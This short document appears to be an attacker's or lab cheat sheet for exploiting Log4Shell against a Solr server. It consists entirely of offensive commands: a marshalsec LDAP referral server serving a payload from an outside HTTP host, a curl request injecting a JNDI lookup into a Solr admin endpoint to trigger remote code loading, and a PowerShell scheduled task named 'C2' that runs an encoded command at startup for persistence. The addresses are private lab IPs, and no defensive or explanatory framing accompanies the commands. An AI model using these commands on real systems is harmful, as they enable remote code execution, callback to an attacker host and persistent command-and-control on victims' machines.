LDAP referral
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.80.129:8000/#log4j"

jndi
curl 'http://192.168.80.134:8983/solr/admin/cores?foo=$\{jndi:ldap://192.168.80.129:1389/log4j\}'

Persistence Powershell command

$taskAction = New-ScheduledTaskAction ` -Execute 'powershell.exe' ` -Argument '-e '
$taskTrigger = New-ScheduledTaskTrigger -AtStartup
$taskName = "C2"
$description = "attempt c2 connection"
Register-ScheduledTask ` -TaskName $taskName ` -Action $taskAction ` -Trigger $taskTrigger ` -Description $description
